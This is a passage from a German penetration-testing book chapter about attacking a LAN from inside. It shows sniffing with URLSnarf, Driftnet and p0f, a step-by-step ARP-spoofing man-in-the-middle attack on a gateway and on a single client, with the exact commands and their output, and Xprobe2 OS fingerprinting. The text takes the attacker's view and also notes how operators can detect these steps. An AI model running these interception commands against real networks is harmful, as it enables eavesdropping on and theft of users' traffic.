[04/Feb/2010:11:50:39 +0100] \"GET http://www.googleanalytics.com/__utm.gif?utmwv=4.6.5&utmn=2078575665&utmhn=www.neueoz.de&utmcs=UTF-8&utmsr=1680x1050&utmsc=32bit&utmul=de&utmje=1&utmfl=10.0%20r42&utmdt=Neue%20OZ%20online%3A%20Wetterv orhersage&utmhid=1569623518&utmr=0&utmp=%2Fwetter%2Findex.html&utmac=UA17172601&utmcc=__utma%3D30859936.1451443311066144800.1250512488.1265296761.1265311 913.34%3B%2B__utmz%3D30859936.1250586798.3.3.utmcsr%3Dgoogle%7Cutmccn%3D(or ganic)%7Cutmcmd%3Dorganic%7Cutmctr%3DNeue%2520oz%3B HTTP/1.1\" \u2013 \"http://www.neue-oz.de/wetter/index.html\" \" Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\" 192.168.1.225 \u2013 - [04/Feb/2010:11:50:39 +0100] \"GET http://www.neueoz.de/wetter/_images/07.gif HTTP/1.1\" \u2013 - \"http://www.neueoz.de/wetter/index.html\" \" Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\"\n18.3 Passives Mitlesen im LAN: Sniffing\n423\n192.168.1.217 \u2013 - [04/Feb/2010:11:50:52 +0100] \"GET http://watson.microsoft.com/StageOne/avgnsx_exe/8_5_0_316/ntdll_dll/5_1_260 0_5512/00011746.htm?OS=5.1.2600.2.00010100.3.0&lcid=1031 HTTP/1.1\" \u2013 - \"-\" \"MSDW\" 192.168.1.229 \u2013 - [04/Feb/2010:12:08:06 +0100] \"GET http://www.tagesschau.de/xml/rss2 HTTP/1.1\" \u2013 - \"-\" \" Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\" 192.168.1.222 \u2013 - [04/Feb/2010:12:10:00 +0100] \"GET http://www.google.de/coop/cse/brand?form=cse-search-box&lang=de HTTP/1.1\" \u2013 - \"http://www.thunderbird-mail.de/wiki/Hauptseite\" \" Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\" 192.168.1.217 \u2013 - [04/Feb/2010:12:31:39 +0100] \"GET http://watson.microsoft.com/StageOne/avgnsx_exe/8_5_0_316/ntdll_dll/5_1_260 0_5512/00011746.htm?OS=5.1.2600.2.00010100.3.0&lcid=1031 HTTP/1.1\" \u2013 - \"-\" \"MSDW\" 192.168.1.211 \u2013 - [04/Feb/2010:12:31:55 +0100] \"GET http://de.www.mozilla.com/de/thunderbird/2.0.0.14/start/ HTTP/1.1\" \u2013 - \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.8.1.14) Gecko/20080421 Thunderbird/2.0.0.14\" 192.168.1.229 \u2013 - [04/Feb/2010:12:38:50 +0100] \"GET http://www.spiegel.de/static/sys/v9/icons/ic_bullet_unispiegel.gif HTTP/1.1\" \u2013 - \"http://www.spiegel.de/layout/css/http/style-V2-3-4.css\" \" Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\" 192.168.1.211 \u2013 - [04/Feb/2010:13:01:56 +0100] \"GET http://ftp-stud.hsesslingen.de/pub/Mirrors/ftp.mozilla.org/pub//thunderbird/releases/2.0.0.23 /update/win32/de/thunderbird-2.0.0.23.complete.mar HTTP/1.1\" \u2013 - \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.8.1.14) Gecko/20080421 Thunderbird/2.0.0.14\" 192.168.1.212 \u2013 - [04/Feb/2010:13:31:55 +0100] \"GET http://mozilla2.snt.utwente.nl//firefox/releases/3.5.7/update/win32/de/fire fox-3.5.7.complete.mar HTTP/1.1\" \u2013 - \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5\" ^C root@discordia:~#\nDie Kenntnis \u00fcber die Web-Vorlieben der Benutzer und den im Einsatz befindlichen Webbrowser (erkennbar an dem User-Agent) bringt einen b\u00f6swilligen Netzwerkforscher in Besitz einer m\u00e4chtigen Waffe: Die mittels URLSnarf gewonnene Erkenntnis hilft beispielsweise dann, wenn es in einem sp\u00e4teren Schritt darum gehen soll, das Opfer gezielt auf eine manipulierte Website zu lenken, um ihm dann \u00fcber eine m\u00f6gliche Schw\u00e4che des Internet-Browsers einen Sch\u00e4dling zuzustellen (vgl. hierzu das Kapitel \u00bbMalware-Attacke aus dem Internet\u00ab).\n424\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\n18.3.5 Driftnet Bei dem bereits im WLAN-Kapitel kurz vorgestellten Driftnet handelt es sich um ein Tool, das den Netzwerkverkehr abh\u00f6rt und alle \u00fcbertragenen Bilder bequem auf dem Rechner des Angreifers anzeigt. In WG-Netzen, in denen erfahrungsgem\u00e4\u00df viel pr0n200 \u00fcbertragen wird, ist diese Slideshow der ganz besonderen Art jedoch um ein Vielfaches delizi\u00f6ser als in Unternehmensnetzen. Ein Start des Programms liefert ein Ergebnis wie das folgende: root@discordia:~# driftnet root@discordia:~#\nBild 18.16: Eine Slideshow der ganz besonderen Art dank Driftnet\n18.3.6 P0f Der Sniffer P0f ermittelt durch eine passive Analyse von TCP/IP-Paketen die im Netzwerk verwendeten Betriebssysteme. Bislang k\u00f6nnen wir nur dar\u00fcber spekulieren, welche Rechner im fremden Netzwerk betrieben werden (z. B. \u00fcber die verwendeten Protokolle und Dienste): P0f bringt uns eine gewisse Klarheit.\n200\nhttp://en.wikipedia.org/wiki/Leet\n18.3 Passives Mitlesen im LAN: Sniffing\n425\nroot@discordia:~# p0f -i eth0 p0f \u2013 passive os fingerprinting utility, version 2.0.8 (C) M. Zalewski , W. Stearns\n[[email protected]](/cdn-cgi/l/email-protection)\np0f: listening (SYN) on 'eth0', 262 sigs (14 generic, cksum 0F1F5CA2), rule: 'all'. 192.168.2.100:60784 \u2013 Linux 2.6 (newer, 2) (up: 2476 hrs) -> 192.168.1.100:3551 (distance 1, link: ethernet/modem) 192.168.1.100:59579 \u2013 Linux 2.6 (newer, 3) (up: 148 hrs) -> 81.169.145.136:110 (distance 0, link: ethernet/modem) 192.168.1.55:1073 \u2013 Linux 2.6, seldom 2.4 (older, 4) (up: 18 hrs) -> 192.168.1.100:445 (distance 0, link: ethernet/modem) 192.168.1.225:1279 \u2013 Windows 2000 SP4, XP SP1+ -> 192.168.1.100:139 (distance 0, link: ethernet/modem) 192.168.1.217:1034 \u2013 Windows 2000 SP4, XP SP1+ -> 92.122.212.138:80 (distance 0, link: ethernet/modem) 192.168.1.10:1471 \u2013 Windows 2000 SP4, XP SP1+ -> 63.245.209.58:80 (distance 0, link: ethernet/modem) 192.168.1.10:1474 \u2013 Windows 2000 SP4, XP SP1+ -> 193.99.144.85:80 (distance 0, link: ethernet/modem) 192.168.1.225:1282 \u2013 Windows 2000 SP4, XP SP1+ -> 85.183.249.137:80 (distance 0, link: ethernet/modem) 192.168.1.217:1042 \u2013 Windows 2000 SP4, XP SP1+ -> 192.168.1.229:5900 (distance 0, link: ethernet/modem) 192.168.2.100:46922 \u2013 Linux 2.6 (newer, 2) (up: 2476 hrs) -> 192.168.1.100:3551 (distance 1, link: ethernet/modem) 192.168.1.100:45292 \u2013 Linux 2.6 (newer, 3) (up: 148 hrs) -> 81.169.145.136:110 (distance 0, link: ethernet/modem) 192.168.1.10:2403 \u2013 Windows 2000 SP4, XP SP1+ -> 92.123.68.11:80 (distance 0, link: ethernet/modem) 192.168.1.241:1127 \u2013 Windows 2000 SP2+, XP SP1+ (seldom 98) -> 192.168.1.100:8333 (distance 1, link: unknown-1376) 192.168.1.222:1267 \u2013 Windows 2000 SP4, XP SP1+ -> 74.125.39.103:80 (distance 0, link: ethernet/modem) 192.168.1.100:49821 \u2013 Linux 2.6 (newer, 3) (up: 149 hrs) -> 81.169.145.136:110 (distance 0, link: ethernet/modem) 192.168.1.229:1845 \u2013 Windows XP SP1+, 2000 SP3 -> 93.184.220.20:80 (distance 0, link: ethernet/modem) ^C +++ Exiting on signal 2 +++ [+] Average packet ratio: 17.00 per minute. root@discordia:~#\nP0f kann dar\u00fcber hinaus PCAP-Data-Files einlesen, die beispielsweise mit Wireshark oder Tcpdump (tcpdump -w ) erstellt wurden. \u00dcber diesen Weg k\u00f6nnen wir auch nachtr\u00e4glich eine Analyse des Netzwerkverkehrs durchf\u00fchren, wie folgender Programmaufruf verdeutlicht:\n426\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\nroot@discordia:/home/hax00r# ls \u2013l insgesamt 712440 -rw-r--r-- 1 hax00r hax00r 728821760 15. Jan 2010 tcpdump_pcap.log root@discordia:/home/hax00r# p0f -s tcpdump_pcap.log p0f \u2013 passive os fingerprinting utility, version 2.0.8 (C) M. Zalewski , W. Stearns\n[[email protected]](/cdn-cgi/l/email-protection)\np0f: listening (SYN) on 'tcpdump_pcap.log', 262 sigs (14 generic, cksum 0F1F5CA2), rule: 'all'. 192.168.2.100:60784 \u2013 Linux 2.6 (newer, 2) (up: 2476 hrs) -> 192.168.1.100:3551 (distance 1, link: ethernet/modem) 192.168.1.100:59579 \u2013 Linux 2.6 (newer, 3) (up: 148 hrs) -> 81.169.145.136:110 (distance 0, link: ethernet/modem) 192.168.1.55:1073 \u2013 Linux 2.6, seldom 2.4 (older, 4) (up: 18 hrs) -> 192.168.1.100:445 (distance 0, link: ethernet/modem) 192.168.1.225:1279 \u2013 Windows 2000 SP4, XP SP1+ -> 192.168.1.100:139 (distance 0, link: ethernet/modem) 192.168.1.217:1034 \u2013 Windows 2000 SP4, XP SP1+ -> 92.122.212.138:80 (distance 0, link: ethernet/modem) 192.168.1.10:1471 \u2013 Windows 2000 SP4, XP SP1+ -> 63.245.209.58:80 (distance 0, link: ethernet/modem) 192.168.1.10:1474 \u2013 Windows 2000 SP4, XP SP1+ -> 193.99.144.85:80 (distance 0, link: ethernet/modem) 192.168.1.225:1282 \u2013 Windows 2000 SP4, XP SP1+ -> 85.183.249.137:80 (distance 0, link: ethernet/modem) 192.168.1.217:1042 \u2013 Windows 2000 SP4, XP SP1+ -> 192.168.1.229:5900 (distance 0, link: ethernet/modem) 192.168.2.100:46922 \u2013 Linux 2.6 (newer, 2) (up: 2476 hrs) -> 192.168.1.100:3551 (distance 1, link: ethernet/modem) 192.168.1.100:45292 \u2013 Linux 2.6 (newer, 3) (up: 148 hrs) -> 81.169.145.136:110 (distance 0, link: ethernet/modem) 192.168.1.10:2403 \u2013 Windows 2000 SP4, XP SP1+ -> 92.123.68.11:80 (distance 0, link: ethernet/modem) 192.168.1.241:1127 \u2013 Windows 2000 SP2+, XP SP1+ (seldom 98) -> 192.168.1.100:8333 (distance 1, link: unknown-1376) 192.168.1.222:1267 \u2013 Windows 2000 SP4, XP SP1+ -> 74.125.39.103:80 (distance 0, link: ethernet/modem) 192.168.1.100:49821 \u2013 Linux 2.6 (newer, 3) (up: 149 hrs) -> 81.169.145.136:110 (distance 0, link: ethernet/modem) 192.168.1.229:1845 \u2013 Windows XP SP1+, 2000 SP3 -> 93.184.220.20:80 (distance 0, link: ethernet/modem) [+] End of input file. root@discordia:/home/hax00r#\nP0f liefert einen weiteren Meilenstein: Zum ersten Mal nehmen die im Netzwerk befindlichen Betriebssysteme konkrete Gestalt an (zu entdecken sind sowohl Clients mit Windows 2000 SP2/SP4, Windows XP als auch Linux-Rechner mit Kernel 2.6) und erm\u00f6glichen uns somit eine weitere Fokussierung.\n18.3 Passives Mitlesen im LAN: Sniffing\n427\n18.3.7 ARPSpoof Obwohl wir ARPSpoof (ein weiterer Bestandteil der DSniff-Suite) bislang noch nicht vorgestellt hatten, ist es doch beim Sniffing unser st\u00e4ndiger Begleiter. Der Grund daf\u00fcr ist die Tatsache, dass die \u00bbordin\u00e4ren\u00ab Netzwerk-Knoten in Form von Hubs binnen der letzten Jahre fast vollst\u00e4ndig von Switches verdr\u00e4ngt wurden. Landet der Forscher n\u00e4mlich in einem Netzwerk, welches nicht \u00fcber Hubs, sondern \u00fcber Switches gekoppelt ist, fallen beim Sniffing keinerlei Daten ab \u2013 sehr zum Bedauern eines Datensammlers. Dieser Umstand liegt darin begr\u00fcndet, dass ein Hub die Netzwerkanfragen an alle angeschlossenen Teilnehmer weiterleitet, ein Switch jedoch eine dezidierte logische Verbindung zwischen zwei Netzwerkteilnehmern aufbaut. Durch die Switching-Technik werden ausschlie\u00dflich Datenpakete an den jeweiligen Rechner versandt, die an den Rechner speziell oder \u00fcber einen Broadcast an alle Rechner adressiert sind. Das bedeutet im Klartext: Wenn Teilnehmer Alice und Bob miteinander sprechen, wird Eve grunds\u00e4tzlich ignoriert \u2013 was das Abh\u00f6ren von Nachrichten nat\u00fcrlich ungemein erschwert. M\u00fcssen wir als Netzwerkforscher nun die Flinte ins Korn werfen und Tr\u00fcbsal dar\u00fcber blasen, in einer geswitchten Umgebung ausgesperrt zu sein? Nein, mit Sicherheit nicht. Bei einem Switch gestaltet sich unser Vorhaben nur ein wenig anspruchsvoller, frei nach dem Motto von J.L. Picard: \u00bbJe schwieriger die Aufgabe, desto gr\u00f6\u00dfer der Erfolg\u00ab. Das soeben angesprochene ARPSpoof geh\u00f6rt n\u00e4mlich zu den Werkzeugen, die den Nachrichtenverkehr gezielt umlenken k\u00f6nnen, beispielsweise auf den Rechner des Angreifers, also auf unseren. F\u00fcr unser Beispiel setzen wir auf ARP-Spoofing: Wir injizieren gef\u00e4lschte ARP-Pakete in das Netzwerk, um den Datenverkehr zwischen den Hosts zu manipulieren und in Form einer Man-in-the-Middle-Attack auf unseren Rechner umzuleiten. Durch ARPSpoofing wird somit der urspr\u00fcnglich f\u00fcr den Gateway bestimmte Netzwerkverkehr vorerst \u00fcber unseren Rechner geschleust, bevor wir die Netzwerkpakete der eigentlichen Bestimmung, n\u00e4mlich wieder dem Gateway zuf\u00fchren. Diese kleine Extrarunde erm\u00f6glicht es, den gesamten Traffic, der eigentlich an den Gateway gehen soll, \u00fcber unseren Rechner zu leiten. Das Sch\u00f6ne bei der Sache ist, dass wir die Daten frei Haus erhalten und mit den soeben vorgestellten Sniffer-Programmen die f\u00fcr uns wertvollen Inhalte wie durch ein Schleppnetz, das in eine Schleuse gespannt ist, abgreifen k\u00f6nnen. Der Einsatz von ARPSpoof verl\u00e4uft dreistufig: 1. Kurze Kontaktaufnahme mit dem Ziel durch ICMP: root@discordia:~# ping 192.168.1.1 PING 192.168.1.1 (192.168.1.1) 56(84) bytes of data. 64 bytes from 192.168.1.1: icmp_seq=1 ttl=64 time=0.638 ms 64 bytes from 192.168.1.1: icmp_seq=2 ttl=64 time=0.611 ms ^C --- 192.168.1.1 ping statistics --2 packets transmitted, 2 received, 0% packet loss, time 1000ms rtt min/avg/max/mdev = 0.611/0.624/0.638/0.028 ms root@discordia:~#\n428\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\n2. Aktivierung von IP-Forwarding auf unserem PC (alternativ dazu bietet sich auch das NIDS-Toolkit Fragrouter201 an): root@discordia:~# echo 1 > /proc/sys/net/ipv4/ip_forward root@discordia:~# cat /proc/sys/net/ipv4/ip_forward 1 root@discordia:~#\n3. Start von ARPSpoof (bei der IP-Adresse 192.168.1.1 handelt es sich um das Gateway): root@discordia:~# arpspoof -i eth0 0:21:86:58:f0:ce ff:ff:ff:ff:ff:ff 0:21:86:58:f0:ce 0:21:86:58:f0:ce ff:ff:ff:ff:ff:ff 0:21:86:58:f0:ce 0:21:86:58:f0:ce ff:ff:ff:ff:ff:ff 0:21:86:58:f0:ce 0:21:86:58:f0:ce ff:ff:ff:ff:ff:ff 0:21:86:58:f0:ce 0:21:86:58:f0:ce ff:ff:ff:ff:ff:ff 0:21:86:58:f0:ce 0:21:86:58:f0:ce ff:ff:ff:ff:ff:ff 0:21:86:58:f0:ce 0:21:86:58:f0:ce ff:ff:ff:ff:ff:ff 0:21:86:58:f0:ce 0:21:86:58:f0:ce ff:ff:ff:ff:ff:ff 0:21:86:58:f0:ce 0:21:86:58:f0:ce ff:ff:ff:ff:ff:ff 0:21:86:58:f0:ce 0:21:86:58:f0:ce ff:ff:ff:ff:ff:ff 0:21:86:58:f0:ce (...)\n201\nhttp://www.securityfocus.com/tools/176\n192.168.1.1 0806 42: arp reply 192.168.1.1 is-at 0806 42: arp reply 192.168.1.1 is-at 0806 42: arp reply 192.168.1.1 is-at 0806 42: arp reply 192.168.1.1 is-at 0806 42: arp reply 192.168.1.1 is-at 0806 42: arp reply 192.168.1.1 is-at 0806 42: arp reply 192.168.1.1 is-at 0806 42: arp reply 192.168.1.1 is-at 0806 42: arp reply 192.168.1.1 is-at 0806 42: arp reply 192.168.1.1 is-at\n18.3 Passives Mitlesen im LAN: Sniffing\n429\nWenn der Netzforscher es im Gegensatz zum vorigem Beispiel nicht auf das gesamte Netzwerk, sondern lediglich auf einen Client (z. B. auf 192.168.1.10) abgesehen hat, gestaltet sich der Aufruf von ARPSpoof wie folgt: 1. Kurze Kontaktaufnahme mit den Zielen durch ICMP: root@discordia:~# ping 192.168.1.1 PING 192.168.1.1 (192.168.1.1) 56(84) bytes of data. 64 bytes from 192.168.1.1: icmp_seq=1 ttl=64 time=0.638 ms 64 bytes from 192.168.1.1: icmp_seq=2 ttl=64 time=0.611 ms ^C --- 192.168.1.1 ping statistics --2 packets transmitted, 2 received, 0% packet loss, time 1000ms rtt min/avg/max/mdev = 0.611/0.624/0.638/0.028 ms root@discordia:~# ping 192.168.1.10 PING 192.168.1.10 (192.168.1.10) 56(84) bytes of data. 64 bytes from 192.168.1.10: icmp_seq=1 ttl=128 time=0.299 ms 64 bytes from 192.168.1.10: icmp_seq=2 ttl=128 time=0.504 ms ^C --- 192.168.1.10 ping statistics --2 packets transmitted, 2 received, 0% packet loss, time 1000ms rtt min/avg/max/mdev = 0.299/0.401/0.504/0.104 ms root@discordia:~#\n2. Aktivierung von IP-Forwarding auf unserem PC: root@discordia:~# echo 1 > /proc/sys/net/ipv4/ip_forward root@discordia:~# cat /proc/sys/net/ipv4/ip_forward 1 root@discordia:~#\n3. Start von ARPSpoof: root@discordia:~# arpspoof -i eth0 -t 192.168.1.10 192.168.1.1 0:21:86:58:f0:ce 0:21:86:58:f0:ce 0:21:86:58:f0:ce 0:21:86:58:f0:ce 0:21:86:58:f0:ce 0:21:86:58:f0:ce 0:21:86:58:f0:ce 0:21:86:58:f0:ce 0:21:86:58:f0:ce 0:21:86:58:f0:ce 0:21:86:58:f0:ce 0:21:86:58:f0:ce\n0:17:31:78:81:c7 0806 42: arp reply 192.168.1.1 is-at 0:17:31:78:81:c7 0806 42: arp reply 192.168.1.1 is-at 0:17:31:78:81:c7 0806 42: arp reply 192.168.1.1 is-at 0:17:31:78:81:c7 0806 42: arp reply 192.168.1.1 is-at 0:17:31:78:81:c7 0806 42: arp reply 192.168.1.1 is-at 0:17:31:78:81:c7 0806 42: arp reply 192.168.1.1 is-at\n430\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\n0:21:86:58:f0:ce 0:17:31:78:81:c7 0806 42: arp reply 192.168.1.1 is-at 0:21:86:58:f0:ce 0:21:86:58:f0:ce 0:17:31:78:81:c7 0806 42: arp reply 192.168.1.1 is-at 0:21:86:58:f0:ce 0:21:86:58:f0:ce 0:17:31:78:81:c7 0806 42: arp reply 192.168.1.1 is-at 0:21:86:58:f0:ce (...)\nDie Nachteile von ARPSpoof sollen nicht verschwiegen werden: ARP-Spoofing stellt einen erheblichen Eingriff in das Netzwerk dar. Dem Switch werden laufend falsche Werte untergejubelt, was eine Menge Radau verursacht. Wer als Betreiber seine Switches im Blick hat, beispielsweise durch einen Log-Host, bekommt dieses merkw\u00fcrdige Verhalten ziemlich schnell mit. Zudem darf nicht vergessen werden, dass in gro\u00dfen Netzwerken jede Menge Traffic \u00fcber das Gateway wandert. Da bei einer Man-in-the-MiddleAttacke der Rechner des Netzwerkforschers als Gateway fungiert, muss dieser die Last auch bew\u00e4ltigen k\u00f6nnen. Andernfalls sind Verz\u00f6gerungen im Netz oder gar abbrechende Verbindungen die Folge, was den verantwortlichen Administrator auf dumme Gedanken bringen k\u00f6nnte.\n18.4\nScanning: \u00bbFull Contact\u00ab mit dem LAN\nDurch das (Port-)Scanning erfahren wir, welcher Rechner welche Dienste in dem uns immer noch nicht ganz vertrauten Netz anbietet (z. B. Mail-, Web-, Druck- oder Dateidienste). \u00dcber das Antwortverhalten l\u00e4sst sich anschlie\u00dfend auf das Betriebssystem und auf die eingesetzte Version des Dienstes schlussfolgern. Letzteres ist besonders dann von Interesse, wenn veraltete oder fehleranf\u00e4llige Dienste eingesetzt werden, z. B. ein Webdienst, der anf\u00e4llig ist f\u00fcr einen bestimmten Angriff. Unser Interesse gilt prim\u00e4r den Servern, die beim Sniffing durch \u00fcberaus hohen Traffic \u00bbangenehm\u00ab aufgefallen sind. Der Erfahrung nach stehen diese Maschinen ganz weit oben auf der Liste der bedeutsamen Server. Kommen zum hohen Traffic noch Dienste hinzu, die sich zuordnen lassen (z. B. FTP-, HTTP-, Mail-, File- oder Datenbankdienste), sind die Kronjuwelen des Unternehmens enttarnt. Der Einsatz eines Portscanners gestaltet sich in den meisten F\u00e4llen gleich: Ziel(e) definieren, Methode des Scanvorgangs w\u00e4hlen, zus\u00e4tzliche Parameter freigeben und nach dem Start auf R\u00fcckmeldung warten. Hier erneut der Hinweis, dass die Zeit der Passivit\u00e4t beim Einsatz von Scannern endg\u00fcltig vorbei ist. Mit einem Portscan wird gew\u00f6hnlicherweise viel L\u00e4rm erzeugt. Hier h\u00e4ngt es jeweils davon ab, wie der Netzwerkbetreiber aufgestellt ist und was unsere bisherigen Untersuchungen ergeben haben. Sind beispielsweise mehrheitlich verschl\u00fcsselte Verbindungen an der Tagesordnung? Lassen sich durch passive Fingerprints ausschlie\u00dflich aktuelle Betriebssysteme entdecken? Hinterl\u00e4sst das Netzwerk grunds\u00e4tzlich einen wohlstrukturierten Einsatz? Bei einem dreimaligen \u00bbJa\u00ab erscheint es ratsam, nach neuen Bet\u00e4tigungsfeldern Ausschau zu halten oder aber extrem vorsichtig vorzugehen. Wer als Netzwerkbetreiber seine\n18.4 Scanning: \u00bbFull Contact\u00ab mit dem LAN\n431\nHausaufgaben gewissenhaft erledigt und unsere Netzwerkforscher vielleicht nur durch einen exotischen Zwischenfall Zugang zum Netz erhalten haben, hat m\u00f6glicherweise ein paar Tr\u00fcmpfe in der Hand. So beispielsweise in Form wirkungsvoller Security Policies, aufgeweckter Administratoren (die t\u00e4glich Logfiles pr\u00fcfen) oder eines IDS, welches bereits Alarm schl\u00e4gt, wenn auch nur Ans\u00e4tze eines Portscans zu entdecken sind. In dem bislang geschilderten Szenario gibt es allerdings nicht den geringsten Anhaltspunkt f\u00fcr den Hauch eines Sicherheitsbewusstseins \u2013 im Gegenteil. Folglich fahren wir mit den n\u00e4chsten, nun aktiven Schritten fort.\n18.4.1 Xprobe2 Das Programm Xprobe2 stellt einen guten Einstieg f\u00fcr den ersten aktiven Blick in ein unbekanntes Netz dar. Das Programm bietet uns facettenreiche M\u00f6glichkeiten, wertvolle Informationen einzuholen. Xprobe2 ist ein aktives Fingerprinting-Tool und versucht \u00fcber R\u00fcckmeldungen des Hosts das Betriebssystem zu erkennen. Der Einsatz gestaltet sich in unserem Szenario wie folgt: root@discordia:~# xprobe2 192.168.1.0/24 Xprobe2 v.0.3 Copyright (c) 2002-2005\n[[email protected]](/cdn-cgi/l/email-protection)\n,\n[[email protected]](/cdn-cgi/l/email-protection)\n,\n[[email protected]](/cdn-cgi/l/email-protection)\n[+] Target is 192.168.1.0/24 [+] Loading modules. [+] Following modules are loaded: [x] [1] ping:icmp_ping \u2013 ICMP echo discovery module [x] [2] ping:tcp_ping \u2013 TCP-based ping discovery module [x] [3] ping:udp_ping \u2013 UDP-based ping discovery module [x] [4] infogather:ttl_calc \u2013 TCP and UDP based TTL distance calculation [x] [5] infogather:portscan \u2013 TCP and UDP PortScanner [x] [6] fingerprint:icmp_echo \u2013 ICMP Echo request fingerprinting module [x] [7] fingerprint:icmp_tstamp \u2013 ICMP Timestamp request fingerprinting module [x] [8] fingerprint:icmp_amask \u2013 ICMP Address mask request fingerprinting module [x] [9] fingerprint:icmp_port_unreach \u2013 ICMP port unreachable fingerprinting module [x] [10] fingerprint:tcp_hshake \u2013 TCP Handshake fingerprinting module [x] [11] fingerprint:tcp_rst \u2013 TCP RST fingerprinting module [x] [12] fingerprint:smb \u2013 SMB fingerprinting module [x] [13] fingerprint:snmp \u2013 SNMPv2c fingerprinting module [+] 13 modules registered [+] Initializing scan engine [+] Running scan engine\n432\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\n[-] ping:tcp_ping module: no closed/open TCP ports known on 192.168.1.1. Module test failed [-] ping:udp_ping module: no closed/open UDP ports known on 192.168.1.1. Module test failed [-] No distance calculation. 192.168.1.1 appears to be dead or no ports known [+] Host: 192.168.1.1 is up (Guess probability: 50%) [+] Target: 192.168.1.1 is alive. Round-Trip Time: 0.00912 sec [+] Selected safe Round-Trip Time value is: 0.01824 sec [-] fingerprint:tcp_hshake Module execution aborted (no open TCP ports known) [-] fingerprint:smb need either TCP port 139 or 445 to run [-] fingerprint:snmp: need UDP port 161 open [+] Primary guess: [+] Host 192.168.1.1 Running OS: \"Foundry Networks IronWare Version 03.0.01eTc1\" (Guess probability: 100%) [+] Other guesses: [+] Host 192.168.1.1 Running OS: \"Linux Kernel 2.4.21\" (Guess probability: 91%) [+] Host 192.168.1.1 Running OS: \"Linux Kernel 2.4.22\" (Guess probability: 91%) [+] Host 192.168.1.1 Running OS: \"Foundry Networks IronWare Version 07.5.04T53\" (Guess probability: 91%) [+] Host 192.168.1.1 Running OS: \"Foundry Networks IronWare Version 07.5.05KT53\" (Guess probability: 91%) [+] Host 192.168.1.1 Running OS: \"Foundry Networks IronWare 07.6.01BT51\" (Guess probability: 91%) [+] Host 192.168.1.1 Running OS: \"Foundry Networks IronWare 07.6.04aT51\" (Guess probability: 91%) [+] Host 192.168.1.1 Running OS: \"Foundry Networks IronWare 07.7.01eT53\" (Guess probability: 91%) [+] Host 192.168.1.1 Running OS: \"Linux Kernel 2.4.23\" (Guess probability: 91%) [+] Host 192.168.1.1 Running OS: \"Linux Kernel 2.4.24\" (Guess probability: 91%) (...) [-] ping:tcp_ping module: no closed/open TCP ports known on 192.168.1.184. Module test failed [-] ping:udp_ping module: no closed/open UDP ports known on 192.168.1.184. Module test failed [-] No distance calculation. 192.168.1.184 appears to be dead or no ports known [+] Host: 192.168.1.184 is down (Guess probability: 0%) (...)\n18.4 Scanning: \u00bbFull Contact\u00ab mit dem LAN\n433\n[+] Host: 192.168.1.211 is up (Guess probability: 50%) [+] Target: 192.168.1.211 is alive. Round-Trip Time: 0.01829 sec [+] Selected safe Round-Trip Time value is: 0.03658 sec [-] fingerprint:tcp_hshake Module execution aborted (no open TCP ports known) [-] fingerprint:smb need either TCP port 139 or 445 to run [-] fingerprint:snmp: need UDP port 161 open [+] Primary guess: [+] Host 192.168.1.211 Running OS: \"Linux Kernel 2.4.22\" (Guess probability: 100%) [+] Other guesses: [+] Host 192.168.1.211 Running OS: \"Linux Kernel 2.4.23\" (Guess probability: 100%) [+] Host 192.168.1.211 Running OS: \"Linux Kernel 2.4.21\" (Guess probability: 100%) [+] Host 192.168.1.211 Running OS: \"Linux Kernel 2.4.20\" (Guess probability: 100%) [+] Host 192.168.1.211 Running OS: \"Linux Kernel 2.4.19\" (Guess probability: 100%) [+] Host 192.168.1.211 Running OS: \"Linux Kernel 2.4.24\" (Guess probability: 100%) [+] Host 192.168.1.211 Running OS: \"Linux Kernel 2.4.25\" (Guess probability: 100%) [+] Host 192.168.1.211 Running OS: \"Linux Kernel 2.4.26\" (Guess probability: 100%) [+] Host 192.168.1.211 Running OS: \"Linux Kernel 2.4.27\" (Guess probability: 100%) [+] Host 192.168.1.211 Running OS: \"Linux Kernel 2.4.28\" (Guess probability: 100%) [-] ping:tcp_ping module: no closed/open TCP ports known on 192.168.1.212. Module test failed [-] ping:udp_ping module: no closed/open UDP ports known on 192.168.1.212. Module test failed [-] No distance calculation. 192.168.1.212 appears to be dead or no ports known [+] Host: 192.168.1.212 is down (Guess probability: 0%) [-] ping:tcp_ping module: no closed/open TCP ports known on 192.168.1.213. Module test failed [-] ping:udp_ping module: no closed/open UDP ports known on 192.168.1.213. Module test failed [-] No distance calculation. 192.168.1.213 appears to be dead or no ports known [+] Host: 192.168.1.213 is up (Guess probability: 50%) [+] Target: 192.168.1.213 is alive. Round-Trip Time: 0.00426 sec [+] Selected safe Round-Trip Time value is: 0.00853 sec\n434\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\n[-] fingerprint:tcp_hshake Module execution aborted (no open TCP ports known) [-] fingerprint:smb need either TCP port 139 or 445 to run [-] fingerprint:snmp: need UDP port 161 open [+] Primary guess: [+] Host 192.168.1.213 Running OS: \"Microsoft Windows 2003 Server Standard Edition\" (Guess probability: 100%) [+] Other guesses: [+] Host 192.168.1.213 Running OS: \"Microsoft Windows 2003 Server Enterprise Edition\" (Guess probability: 100%) [+] Host 192.168.1.213 Running OS: \"Microsoft Windows XP SP2\" (Guess probability: 100%) [+] Host 192.168.1.213 Running OS: \"Microsoft Windows 2000 Workstation\" (Guess probability: 100%) [+] Host 192.168.1.213 Running OS: \"Microsoft Windows 2000 Workstation SP1\" (Guess probability: 100%) [+] Host 192.168.1.213 Running OS: \"Microsoft Windows 2000 Workstation SP2\" (Guess probability: 100%) [+] Host 192.168.1.213 Running OS: \"Microsoft Windows 2000 Workstation SP3\" (Guess probability: 100%) [+] Host 192.168.1.213 Running 